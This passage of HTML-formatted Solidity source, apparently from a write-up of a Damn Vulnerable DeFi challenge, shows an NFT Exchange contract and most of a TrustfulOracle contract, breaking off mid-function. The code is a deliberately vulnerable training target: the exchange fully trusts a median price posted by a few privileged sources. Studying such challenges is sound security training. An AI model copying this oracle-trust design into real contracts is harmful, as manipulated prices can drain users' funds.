class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./TrustfulOracle.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableNFT.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title Exchange\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Exchange</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    DamnValuableNFT <span class=\"token keyword\">public</span> immutable token<span class=\"token punctuation\">;</span>\n    TrustfulOracle <span class=\"token keyword\">public</span> immutable oracle<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">TokenBought</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> buyer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">TokenSold</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> seller<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> oracleAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        token <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DamnValuableNFT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        oracle <span class=\"token operator\">=</span> <span class=\"token function\">TrustfulOracle</span><span class=\"token punctuation\">(</span>oracleAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">buyOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> nonReentrant <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> amountPaidInWei <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amountPaidInWei <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Amount paid must be greater than zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Price should be in [wei / NFT]</span>\n        <span class=\"token builtin\">uint256</span> currentPriceInWei <span class=\"token operator\">=</span> oracle<span class=\"token punctuation\">.</span><span class=\"token function\">getMedianPrice</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">symbol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amountPaidInWei <span class=\"token operator\">>=</span> currentPriceInWei<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Amount paid is not enough\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> tokenId <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">safeMint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>amountPaidInWei <span class=\"token operator\">-</span> currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">TokenBought</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> tokenId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sellOne</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">ownerOf</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Seller must be the owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">getApproved</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Seller must have approved transfer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Price should be in [wei / NFT]</span>\n        <span class=\"token builtin\">uint256</span> currentPriceInWei <span class=\"token operator\">=</span> oracle<span class=\"token punctuation\">.</span><span class=\"token function\">getMedianPrice</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">symbol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> currentPriceInWei<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough ETH in balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">burn</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">TokenSold</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"TrustfulOracle-code\"><a href=\"#TrustfulOracle-code\" class=\"headerlink\" title=\"TrustfulOracle code\"></a><strong>TrustfulOracle</strong> code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/access/AccessControlEnumerable.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title TrustfulOracle\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n * @notice A price oracle with a number of trusted sources that individually report prices for symbols.\n *         The oracle's price for a given symbol is the median price of the symbol over all sources.\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TrustfulOracle</span> <span class=\"token keyword\">is</span> AccessControlEnumerable <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> TRUSTED_SOURCE_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"TRUSTED_SOURCE_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> INITIALIZER_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"INITIALIZER_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Source address => (symbol => price)</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> pricesBySource<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyTrustedSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">hasRole</span><span class=\"token punctuation\">(</span>TRUSTED_SOURCE_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyInitializer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">hasRole</span><span class=\"token punctuation\">(</span>INITIALIZER_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">UpdatedPrice</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> source<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">indexed</span> symbol<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> oldPrice<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> newPrice\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> sources<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span> enableInitialization<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> sources<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>TRUSTED_SOURCE_ROLE<span class=\"token punctuation\">,</span> sources<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>enableInitialization<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>INITIALIZER_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// A handy utility allowing the deployer to setup initial prices (only once)</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setupInitialPrices</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> sources<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> symbols<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> prices\n    <span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">public</span>\n        onlyInitializer\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Only allow one (symbol, price) per source</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> symbols<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&amp;&amp;</span> symbols<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> prices<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> sources<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_setPrice</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> symbols<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">renounceRole</span><span class=\"token punctuation\">(</span>INITIALIZER_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> newPrice<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyTrustedSource <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_setPrice</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">,</span> newPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getMedianPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">_computeMedianPrice</span><span class=\"token punctuation\">(</span>symbol<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getAllPricesForSymbol</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> numberOfSources <span class=\"token operator\">=</span> <span class=\"token function\">getNumberOfSources</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> prices <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>numberOfSources<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> numberOfSources<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">address</span> source <span class=\"token operator\">=</span> <span class=\"token function\">getRoleMember</span><span class=\"token punctuation\">(</span>TRUSTED_SOURCE_ROLE<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">getPriceBySource</span><span class=\"token punctuation\">(</span>symbol<span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">return</span> prices<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getPriceBySource</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> source<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> pricesBySource<span class=\"token punctuation\">[</span>source<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>symbol<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getNumberOfSources</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">getRoleMemberCount</span><span class=\"token punctuation\">(</span>TRUSTED_SOURCE_ROLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_setPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> source<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> newPrice<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> oldPrice <span class=\"token operator\">=</span> pricesBySource<span class=\"token punctuation\">[</span>source<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>symbol<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        pricesBySource<span class=\"token punctuation\">[</span>source<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>symbol<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> newPrice<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">UpdatedPrice</span><span class=\"token punctuation\">(</span>source<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">,</span> oldPrice<span class=\"token punctuation\">,</span> newPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_computeMedianPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> prices <span class=\"token operator\">=</span> <span class=\"token function\">_sort</span><span class=\"token punctuation\">(</span><span class=\"token function\">getAllPricesForSymbol</span><span class=\"token punctuation\">(</span>symbol<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// calculate median price</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">uint256</span> leftPrice <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">uint256</span> rightPrice <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>leftPrice <span class=\"token operator\">+</span> rightPrice<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> prices<span class=\"token punctuation\">[</span>prices<span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_sort</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> arrayOfNumbers<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> arrayOfNumbers<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> j <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> arrayOfNumbers<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>arrayOfNumbers<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> arrayOfNumbers<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token builtin\">uint256</span> tmp <span class=\"token operator\">=</span> arrayOfNumbers<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                    arrayOfNumbers<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> arrayOfNumbers<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                    arrayOfNumbers<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>        \n        <span class=\"token 